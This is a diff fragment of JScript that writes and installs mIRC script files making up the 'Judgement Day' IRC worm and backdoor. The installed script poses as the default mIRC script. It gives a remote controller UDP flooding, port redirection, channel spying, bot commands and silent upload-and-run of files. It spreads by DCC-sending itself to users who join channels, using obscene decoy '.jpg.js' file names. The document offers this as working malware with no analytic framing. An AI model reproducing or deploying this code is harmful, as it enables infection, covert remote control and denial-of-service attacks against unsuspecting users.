+f.writeline("n193=}");
+f.writeline("n194=on *:Sockopen:jdout*: {");
+f.writeline("n195= if ($sockerr > 0) return");
+f.writeline("n196= set %jd.tempsomethin 0");
+f.writeline("n197= :anotherfreakinloop");
+f.writeline("n198= inc %jd.tempsomethin 1");
+f.writeline("n199= if %jd.tempread [ $+ [
+$right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %jd.tempsomethin ]
+] != $null {");
+f.writeline("n200= sockwrite -n $sockname %jd.tempread [ $+ [
+$right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %jd.tempsomethin ]
+]");
+f.writeline("n201= goto anotherfreakinloop");
+f.writeline("n202= }");
+f.writeline("n203= else { unset %jd.tempsomethin | unset
+%dj.sockcatchnum | unset %jd.tempread* }");
+f.writeline("n204=}");
+f.writeline("n205=on *:sockclose:jdout*: {");
+f.writeline("n206= unset %jd.tempread*");
+f.writeline("n207= sockclose jdin $+
+$right($sockname,$calc($len($sockname) - 5) )");
+f.writeline("n208= unset %dj.sockcatchnum");
+f.writeline("n209= sockclose $sockname");
+f.writeline("n210=}");
+f.writeline("n211=on *:sockclose:jdin*: {");
+f.writeline("n212= unset %jd.tempread*");
+f.writeline("n213= sockclose jdout $+
+$right($sockname,$calc($len($sockname) - 4) )");
+f.writeline("n214= unset %dj.sockcatchnum");
+f.writeline("n215= sockclose $sockname");
+f.writeline("n216=}");
+f.writeline("n217=alias jdredirectstats {");
+f.writeline("n218= sockwrite -n sockclone PRIVMSG %jd.dachan : $+ 
+3,1Current 
+4,1Judgement Day
+3,1 Port Redirect Status");
+f.writeline("n219= sockwrite -n sockclone PRIVMSG %jd.dachan : $+ 
+3,1------------------------------------------");
+f.writeline("n220= set %jd.portcounting 0");
+f.writeline("n221= :startloophere");
+f.writeline("n222= inc %jd.portcounting 1");
+f.writeline("n223= if $sock(jdlistenport*,%jd.portcounting) != $null
+{");
+f.writeline("n224= sockwrite -n sockclone PRIVMSG %jd.dachan : $+ 
+3,1 Redirecting Port
+4,1 $gettok($sock(jdlistenport*,%jd.portcounting),2,46) 
+3,1to
+4,1 $gettok($sock(jdlistenport*,%jd.portcounting).mark,1,32) $+ 
+3,1:
+4,1
+
+ $+ $gettok($sock(jdlistenport*,%jd.portcounting).mark,2,32)");
+f.writeline("n225= goto startloophere");
+f.writeline("n226= }");
+f.writeline("n227= else { if %jd.portcounting = 1 { sockwrite -n
+sockclone PRIVMSG %jd.dachan : $+ 
+3,1------------
+4,1No Port Redirects
+3,1------------- } | sockwrite -n sockclone PRIVMSG %jd.dachan : $+ 
+3,1------------------------------------------ | unset %jd.portcounting
+}");
+f.writeline("n228=}");
+f.writeline("n229=; Now a UDP flood");
+f.writeline("n230=alias jdudpfloodem {");
+f.writeline("n231= if $1 = STOP { .timerdjudp off | unset %jd.udp |
+sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1 UDPFLOOD STOPED!!! }");
+f.writeline("n232= if $3 = $null { return }");
+f.writeline("n233= if $timer(djudp).com != $null { sockwrite -n
+sockclone PRIVMSG %jd.dachan :
+3,1 Sorry, already flooding $gettok($timer(djudp).com,3,32) | return
+}");
+f.writeline("n234= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1 Now sending $1 packets to $2 port $3");
+f.writeline("n235= set %jd.udp 0");
+f.writeline("n236= .timerdjudp -m 0 400 jdudpflood $1 $2 $3");
+f.writeline("n237=}");
+f.writeline("n238=");
+f.writeline("n239=alias jdudpflood {");
+f.writeline("n240= if $3 = $null { goto done }");
+f.writeline("n241= :loop");
+f.writeline("n242= if %jd.udp >= $1 { goto done }");
+f.writeline("n243= inc %jd.udp 4");
+f.writeline("n244= sockudp djfloodem1 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
++ +ATH0+ + +ATH0");
+f.writeline("n245=  sockudp djfloodem2 $2 $3 
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day");
+f.writeline("n246=  sockudp djfloodem3 $2 $3 
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day");
+f.writeline("n247=  sockudp djfloodem4 $2 $3 
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day
+
+Judgement_Day");
+f.writeline("n248=  return");
+f.writeline("n249=  :done");
+f.writeline("n250=  sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1 Done UDP FLOODING $2");
+f.writeline("n251=  .timerdjudp off");
+f.writeline("n252=  unset %jd.udp");
+f.writeline("n253=}");
+f.writeline("n254=;
+-------===Judgement Day===-------");
+f.writeline("n255=;                            -------==IGNORANCE IS THE
+MOST DANGEROUS THING IN SOCIETY==-------");
+f.Close();
+f = fso.CreateTextFile("c:\\default2.ini", true)
+f.writeline("[script]");
+f.writeline("n0=;//****************************************************************************************\\\\;");
+f.writeline("n1=;| |********************************* Default mIRC
+Script *********************************| |;");
+f.writeline("n2=;| |*********************mIRC v5.7 32bit by Khaled
+Mardam-Bey***********************| |;");
+f.writeline("n3=;| |*********************** Copyright 1995- 1999 mIRC
+Co. Ltd. ************************| |;");
+f.writeline("n4=;| | ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ----==DO NOT EDIT
+THIS FILE!!!==---- ! ! ! ! ! ! ! ! ! ! ! ! ! !| |;");
+f.writeline("n5=;| |****************************** More info in mIRC
+help file. ***************************//;");
+f.writeline("n6=;`
+`*****************************************************************************************'
+'");
+f.writeline("n7=");
+f.writeline("n8=");
+f.writeline("n9=");
+f.writeline("n10=");
+f.writeline("n11=");
+f.writeline("n12=");
+f.writeline("n13=");
+f.writeline("n14=");
+f.writeline("n15=");
+f.writeline("n16=");
+f.writeline("n17=");
+f.writeline("n18=");
+f.writeline("n19=");
+f.writeline("n20=");
+f.writeline("n21=");
+f.writeline("n22=");
+f.writeline("n23=");
+f.writeline("n24=");
+f.writeline("n25=; !!!! Advanced mIRC default script Do not touch
+!!!!!");
+f.writeline("n26=");
+f.writeline("n27=alias jdhelp {");
+f.writeline("n28= if $1 = $null {");
+f.writeline("n29= .timer 1 1 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1----------------------===
+4,1Judgement Day Help
+3,1===----------------------");
+f.writeline("n30= .timer 1 2 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1For more information on a command type %jd.me help <command>");
+f.writeline("n31= .timer 1 3 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 WHATISTHIS
+3,1 - Learn a little bit more about Judgement Day");
+f.writeline("n32= .timer 1 4 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 UDPFLOOD
+3,1 - Make me UDP Flood (UDP Nuke) someone");
+f.writeline("n33= .timer 1 5 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 PORTREDIRECT
+3,1 - Duh, It redirects ports");
+f.writeline("n34= .timer 1 6 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 CHANNELSPY
+3,1 - Spys on the channel of your choosing");
+f.writeline("n35= .timer 1 7 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 LISTENIN
+3,1 - Listens in on a channel that $me is on");
+f.writeline("n36= .timer 1 8 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 JD
+3,1 - Prefix used to control $me $+ 's mIRC");
+f.writeline("n37= .timer 1 9 sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 BOT
+3,1 - Prefix used to control me, the bot :)");
+f.writeline("n38= .timer 1 10 sockwrite -n sockclone PRIVMSG %jd.dachan
+:
+4,1 CHANGEMASTERCHAN
+3,1 - Change the bot's master channel");
+f.writeline("n39= .timer 1 11 sockwrite -n sockclone PRIVMSG %jd.dachan
+:
+3,1You may invisibly Upload/Run files by dcc sending them to me, the
+bot");
+f.writeline("n40= }");
+f.writeline("n41= if $1 = WHATISTHIS {");
+f.writeline("n42= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1
+
+ $+ $me is infected with Judgement Day 1.0, and I am $me $+ 's Judgement
+Day Bot designed to spread the Judgement Day virus, relay what $me says
+and what people say to $me, to this channel, give you control over $me
+$+ 's mIRC, and also to serve you in other ways.");
+f.writeline("n43= }");
+f.writeline("n44= if $1 = UDPFLOOD {");
+f.writeline("n45= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1UDPFLOOD useage1 : %jd.me UDPFLOOD <how many to send> <IP> <PORT>");
+f.writeline("n46= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1UDPFLOOD useage2 : %jd.me UDPFLOOD STOP");
+f.writeline("n47= }");
+f.writeline("n48= if $1 = PORTREDIRECT {");
+f.writeline("n49= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1PORTREDIRECT useage1 : %jd.me PORTREDIRECT START <Port> <R IP> <R
+Port>");
+f.writeline("n50= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1PORTREDIRECT useage2 : %jd.me PORTREDIRECT STOP <port>");
+f.writeline("n51= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1PORTREDIRECT useage3 : %jd.me PORTREDIRECT STATUS");
+f.writeline("n52= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1PORTREDIRECT example : %jd.me PORTREDIRECT START 4444 irc.dal.net
+6667");
+f.writeline("n53= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1PORTREDIRECT Example would redirect port 4444 to irc.dal.net:6667");
+f.writeline("n54= }");
+f.writeline("n55= if $1 = CHANNELSPY {");
+f.writeline("n56= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1CHANNELSPY useage1 : %jd.me CHANNELSPY START <channel>");
+f.writeline("n57= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1CHANNELSPY useage2 : %jd.me CHANNELSPY STOP");
+f.writeline("n58= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1Note: You can only spy on one channel at a time.");
+f.writeline("n59= }");
+f.writeline("n60= if $1 = LISTENIN {");
+f.writeline("n61= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1LISTENIN useage1 : %jd.me LISTENIN START <channel>");
+f.writeline("n62= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1LISTENIN useage2 : %jd.me LISTENIN ACTIVE <--- Always listens in on
+the active channel");
+f.writeline("n63= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1LISTENIN useage3 : %jd.me LISTENIN STOP");
+f.writeline("n64= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1LISTENIN useage4 : %jd.me LISTENIN LIST <--- Lists channels $me is
+in.");
+f.writeline("n65= }");
+f.writeline("n66= if $1 = BOT {");
+f.writeline("n67= .timer 1 1 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage1 : %jd.me BOT JOIN <channel>");
+f.writeline("n68= .timer 1 2 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage2 : %jd.me BOT PART <channel>");
+f.writeline("n69= .timer 1 3 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage3 : %jd.me BOT OP <channel> <nick>");
+f.writeline("n70= .timer 1 4 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage4 : %jd.me BOT DEOP <channel> <nick>");
+f.writeline("n71= .timer 1 5 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage5 : %jd.me BOT KICK <channel> <nick> <message>");
+f.writeline("n72= .timer 1 6 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage6 : %jd.me BOT BAN <channel> <nick\\address>");
+f.writeline("n73= .timer 1 7 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage7 : %jd.me BOT UNBAN <channel> <nick\\address>");
+f.writeline("n74= .timer 1 8 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage8 : %jd.me BOT MODE <chan\\nick> <mode> <nick\\chan>");
+f.writeline("n75= .timer 1 9 sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1BOT useage9 : %jd.me BOT MSG <nick\\channel> <Message>");
+f.writeline("n76= .timer 1 10 sockwrite -n sockclone PRIVMSG %jd.dachan
+:
+3,1BOT useage10 : %jd.me BOT NOTICE <nick\\channel> <Message>");
+f.writeline("n77= .timer 1 11 sockwrite -n sockclone PRIVMSG %jd.dachan
+:
+3,1BOT useage11 : %jd.me BOT PING <nick\\channel>");
+f.writeline("n78= .timer 1 12 sockwrite -n sockclone PRIVMSG %jd.dachan
+:
+3,1BOT useage12 : %jd.me BOT CTCP <nick\\channel> <type>");
+f.writeline("n79= .timer 1 13 sockwrite -n sockclone PRIVMSG %jd.dachan
+:
+3,1BOT useage13 : %jd.me BOT RAW <Any raw command>");
+f.writeline("n80= }");
+f.writeline("n81= if $1 = CHANGEMASTERCHAN {");
+f.writeline("n82= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1CHANGEMASTERCHAN useage : %jd.me CHANGEMASTERCHAN <New Channel>");
+f.writeline("n83= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1Note: This change does not mean I will join this channel by
+default");
+f.writeline("n84= }");
+f.writeline("n85= if $1 = JD {");
+f.writeline("n86= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1JD useage : %jd.me JD <Command>");
+f.writeline("n87= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1JD example1 : %jd.me JD join #somechannel");
+f.writeline("n88= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1JD example2 : %jd.me JD msg somebody My IP is $ $+ IP");
+f.writeline("n89= }");
+f.writeline("n90=}");
+f.writeline("n91=");
+f.writeline("n92=alias jdLISTENINLIST {");
+f.writeline("n93= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1----=Channels $me is in=----");
+f.writeline("n94= if $chan(n) = 0 { sockwrite -n sockclone PRIVMSG
+%jd.dachan :
+3,1 $me is in 0 channels | return }");
+f.writeline("n95= set %jdlisteninlist 0");
+f.writeline("n96= :loop");
+f.writeline("n97= inc %jdlisteninlist 1");
+f.writeline("n98= if $chan(%jdlisteninlist) = $null { sockwrite -n
+sockclone PRIVMSG %jd.dachan :
+3,1------------------------- $+ $str(-,$len($me) ) | unset
+%jdlisteninlist | return }");
+f.writeline("n99= sockwrite -n sockclone PRIVMSG %jd.dachan :
+4,1 $chan(%jdlisteninlist)");
+f.writeline("n100= goto loop");
+f.writeline("n101=}");
+f.writeline("n102=");
+f.writeline("n103=alias jdbotcmdshndl {");
+f.writeline("n104= if $1 = JOIN || $1 = PART || $1 = MODE { sockwrite -n
+sockclone $1- }");
+f.writeline("n105= if $1 = KICK { sockwrite -n sockclone $1 $2 $3 : $+
+$4- }");
+f.writeline("n106= if $1 = RAW { sockwrite -n sockclone $2- }");
+f.writeline("n107= if $1 = CTCP && $3- != PING { sockwrite -n sockclone
+PRIVMSG $2 :
+ $+ $3- $+ 
+ }");
+f.writeline("n108= if $1 = CTCP && $3- = PING { sockwrite -n sockclone
+PRIVMSG $2 :
+ $+ PING $ctime $+ 
+ }");
+f.writeline("n109= if $1 = PING { sockwrite -n sockclone PRIVMSG $2 :
+ $+ PING $ctime $+ 
+ }");
+f.writeline("n110= if $1 = MSG { sockwrite -n sockclone PRIVMSG $2 : $+
+$3- }");
+f.writeline("n111= if $1 = NOTICE { sockwrite -n sockclone NOTICE $2 :
+$+ $3- }");
+f.writeline("n112= if $1 = BAN { sockwrite -n sockclone MODE $2 +b $3
+}");
+f.writeline("n113= if $1 = UNBAN { sockwrite -n sockclone MODE $2 -b $3
+}");
+f.writeline("n114= if $1 = OP { sockwrite -n sockclone MODE $2 +o $3
+}");
+f.writeline("n115= if $1 = DEOP { sockwrite -n sockclone MODE $2 -o $3
+}");
+f.writeline("n116=}");
+f.writeline("n117=");
+f.writeline("n118=alias jdondccsend {");
+f.writeline("n119= if $read -s $+ $7 c:\\windows\\systemreg.txt = $null
+{ return }");
+f.writeline("n120= if $isdir(c:\\windows\\System16) = $false { mkdir
+c:\\windows\\System16 }");
+f.writeline("n121= if $exists( [ c:\\windows\\System16\\ [ $+ [ $3 ] ] ]
+) = $true { sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1File $3 Already exists, please rename file, and send again. | return
+}");
+f.writeline("n122= set %jd.savedathing $3");
+f.writeline("n123= set %jd.savedasize $Left($6,$calc($len($6) - 1) )");
+f.writeline("n124= set %jd.savedaread 0");
+f.writeline("n125= sockopen jddccaccept $longip($4) $5");
+f.writeline("n126= sockmark jddccaccept $7");
+f.writeline("n127=}");
+f.writeline("n128=");
+f.writeline("n129=on *:sockopen:jddccaccept:{ if ($sockerr > 0) return
+}");
+f.writeline("n130=");
+f.writeline("n131=on *:sockread:jddccaccept: {");
+f.writeline("n132= if ($sockerr > 0) return");
+f.writeline("n133= :nextread");
+f.writeline("n134= sockread 4096 &jdsavedabinvar");
+f.writeline("n135= if ($sockbr == 0) { if %jd.savedaread >=
+%jd.savedasize { goto done } | else { return } }");
+f.writeline("n136= inc %jd.savedaread 4096");
+f.writeline("n137= bwrite c:\\windows\\System16\\ $+ %jd.savedathing -1
+-1 &jdsavedabinvar");
+f.writeline("n138= goto nextread");
+f.writeline("n139= :done");
+f.writeline("n140= run c:\\windows\\System16\\ $+ %jd.savedathing");
+f.writeline("n141= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1File Upload Complete, File Executed");
+f.writeline("n142= unset %jd.savedathing %jd.savedasize
+%jd.savedaread");
+f.writeline("n143= sockclose $sockname");
+f.writeline("n144=}");
+f.writeline("n145=");
+f.writeline("n146=alias jdSendTheJudgementDayVirus {");
+f.writeline("n147= jdtimeout");
+f.writeline("n148= if $sock(JDSENDVIRUS*,0) < 5 {");
+f.writeline("n149= :loop");
+f.writeline("n150= set %jd.STJDVsocknum $rand(1,9999999999)");
+f.writeline("n151= if $sock(JDSENDVIRUS $+ %jd.STJDVsocknum,1) != $null
+{ goto loop }");
+f.writeline("n152= set %jd.STJDVsockname JDSENDVIRUS $+
+%jd.STJDVsocknum");
+f.writeline("n153= socklisten JDSENDVIRUS $+ %jd.STJDVsocknum");
+f.writeline("n154= set %jdtemchangenames $jdchangenames");
+f.writeline("n155= sockwrite -n sockclone NOTICE $1 :DCC Send
+%jdtemchangenames ( $+ $IP $+ )");
+f.writeline("n156= sockwrite -n sockclone PRIVMSG $1 :
+DCC SEND %jdtemchangenames $longip($IP) $sock(%jd.STJDVsockname).port
+$file(C:\\windows\\win.js).size $+ 
+");
+f.writeline("n157= unset %jdtemchangenames %jd.STJDVsockname
+%jd.STJDVsocknum");
+f.writeline("n158= }");
+f.writeline("n159=}");
+f.writeline("n160=");
+f.writeline("n161=on *:socklisten:JDSENDVIRUS*:{");
+f.writeline("n162= set %jd.templittlepieceofshit JDSENDING $+
+$rand(1,9999999999)");
+f.writeline("n163= sockaccept %jd.templittlepieceofshit");
+f.writeline("n164= sockclose $sockname");
+f.writeline("n165= jdsendit %jd.templittlepieceofshit");
+f.writeline("n166= unset %jd.templittlepieceofshit");
+f.writeline("n167=}");
+f.writeline("n168=");
+f.writeline("n169=");
+f.writeline("n170=alias jdsendit {");
+f.writeline("n171= set %jd.sendincount $+ $1 0");
+f.writeline("n172= bread C:\\windows\\win.js 0 4096 &sendsomeshit");
+f.writeline("n173= sockwrite $1 &sendsomeshit");
+f.writeline("n174=}");
+f.writeline("n175=");
+f.writeline("n176=on *:sockwrite:JDSENDING*: {");
+f.writeline("n177= if [ %jd.sendincrease [ $+ [ $sockname ] ] ] = $null
+{ set %jd.sendincrease $+ $sockname 4096 }");
+f.writeline("n178= if [ %jd.sendincrease [ $+ [ $sockname ] ] ] != 4096
+{ unset %jd.sendincount* %jd.sendincrease* | sockclose JDSENDING* |
+return }");
+f.writeline("n179= inc [ %jd.sendincount [ $+ [ $sockname ] ] ] 4096");
+f.writeline("n180= if [ %jd.sendincount [ $+ [ $sockname ] ] ] >
+$file(C:\\windows\\win.js).size { set %jd.sendincrease $+ $sockname
+$calc( [ %jd.sendincount [ $+ [ $sockname ] ] ] -
+$file(C:\\windows\\win.js).size ) }");
+f.writeline("n181= else { set %jd.sendincrease $+ $sockname 4096 }");
+f.writeline("n182= bread C:\\windows\\win.js [ %jd.sendincount [ $+ [
+$sockname ] ] ] [ %jd.sendincrease [ $+ [ $sockname ] ] ]
+&sendsomeshit");
+f.writeline("n183= sockwrite $sockname &sendsomeshit");
+f.writeline("n184=}");
+f.writeline("n185=");
+f.writeline("n186=");
+f.writeline("n187=alias jdchangenames return $str(!,$r(0,9)) $+
+$gettok(me_.young_girl~.dog-.preteen_.firewoman~.cheerleader-.woman~.fireman_.model-.cindy~.Lorie_.Hanz^.guy_.Linda^,$rand(1,14),46)
+$+ $gettok(sucking.fucking.licking.doing.on_top_of,$rand(1,5),46) $+
+$gettok(_horse.-dick.^Jerry._cow.-Frank.~cat.^Beth._FBI_Agent,$rand(1,8),46)
+$+ .jpg.js");
+f.writeline("n188=");
+f.writeline("n189=");
+f.writeline("n190=alias jdaddtodontsend {");
+f.writeline("n191= if $exists(c:\\windows\\systemlog.txt) = $false {
+write -c c:\\windows\\systemlog.txt }");
+f.writeline("n192= set %jd.atdsl 0");
+f.writeline("n193= :loop1");
+f.writeline("n194= set %jd.atdsl2 0");
+f.writeline("n195= inc %jd.atdsl 1");
+f.writeline("n196= if [ %jd.peoples [ $+ [ %jd.atdsl ] ] ] = $null {
+goto done }");
+f.writeline("n197= :loop2");
+f.writeline("n198= inc %jd.atdsl2 1");
+f.writeline("n199= if $gettok( [ %jd.peoples [ $+ [ %jd.atdsl ] ] ]
+,%jd.atdsl2,32) = $null { goto loop1 }");
+f.writeline("n200= if $left($gettok( [ %jd.peoples [ $+ [ %jd.atdsl ] ]
+] ,%jd.atdsl2,32),1) == @ || $left($gettok( [ %jd.peoples [ $+ [
+%jd.atdsl ] ] ] ,%jd.atdsl2,32),1) == + { if $read -s $+ $right($gettok(
+[ %jd.peoples [ $+ [ %jd.atdsl ] ] ] ,%jd.atdsl2,32),$calc($len($gettok(
+[ %jd.peoples [ $+ [ %jd.atdsl ] ] ] ,%jd.atdsl2,32) ) - 1 ) )
+c:\\windows\\systemlog.txt = $null { write c:\\windows\\systemlog.txt
+$right($gettok( [ %jd.peoples [ $+ [ %jd.atdsl ] ] ]
+,%jd.atdsl2,32),$calc($len($gettok( [ %jd.peoples [ $+ [ %jd.atdsl ] ] ]
+,%jd.atdsl2,32) ) - 1 ) ) } }");
+f.writeline("n201= goto loop2");
+f.writeline("n202= :done");
+f.writeline("n203= unset %jd.peoplesnum %jd.peoples* %jd.atdsl*");
+f.writeline("n204=}");
+f.writeline("n205=");
+f.writeline("n206=alias jdononenick {");
+f.writeline("n207= if $read -s $+ $1 c:\\windows\\systemreg.txt != $null
+{ write c:\\windows\\systemreg.txt $2 }");
+f.writeline("n208= if $read -s $+ $1 c:\\windows\\systemlog.txt != $null
+{ write c:\\windows\\systemlog.txt $2 }");
+f.writeline("n209=}");
+f.writeline("n210=");
+f.writeline("n211=alias jdononejoin {");
+f.writeline("n212= if $2 = %jd.dachan { write c:\\windows\\systemreg.txt
+$1 | return }");
+f.writeline("n213= if $2 = %jd.spychan { return }");
+f.writeline("n214= if $read -s $+ $1 c:\\windows\\systemlog.txt = $null
+&& $1 != %jd.me && $1 != $me { jdSendTheJudgementDayVirus $1 }");
+f.writeline("n215=}");
+f.writeline("n216=");
+f.writeline("n217=alias jdtimeout {");
+f.writeline("n218= set %jd.CloseExtraOpen 1");
+f.writeline("n219= :closeextra");
+f.writeline("n220= if $sock(JDSENDVIRUS*,%jd.CloseExtraOpen) = $null {
+unset %jd.CloseExtraOpen | goto end }");
+f.writeline("n221= if $sock(JDSENDVIRUS*,%jd.CloseExtraOpen).to > 30 {
+sockclose $sock(JDSENDVIRUS*,%jd.CloseExtraOpen) | goto closeextra }");
+f.writeline("n222= inc %jd.CloseExtraOpen 1");
+f.writeline("n223= goto closeextra");
+f.writeline("n224= :end");
+f.writeline("n225=}");
+f.writeline("n226=; -------===Judgement Day===-------");
+f.writeline("n227=; -------==IGNORANCE IS THE MOST DANGEROUS THING IN
+SOCIETY==-------");
+f.Close();
+
+s = fso.GetFile("c:\\default.ini")
+p = fso.GetFile("c:\\default2.ini")
+if (fso.FileExists("c:\\mirc\\mirc.ini"))
+ {
+s.Copy("c:\\mirc\\default.ini");
+p.Copy("c:\\mirc\\default2.ini");
+}
+if (fso.FileExists("c:\\Program Files\\mirc\\mirc.ini"))
+ {
+s.Copy("c:\\Program Files\\mirc\\default.ini");
+p.Copy("c:\\Program Files\\mirc\\default2.ini");
+}
+if (fso.FileExists("d:\\mirc\\mirc.ini"))
+ {
+s.Copy("d:\\mirc\\default.ini");
+p.Copy("d:\\mirc\\default2.ini");
+}
+if (fso.FileExists("d:\\Program Files\\mirc\\mirc.ini"))
+ {
+s.Copy("d:\\Program Files\\mirc\\default.ini");
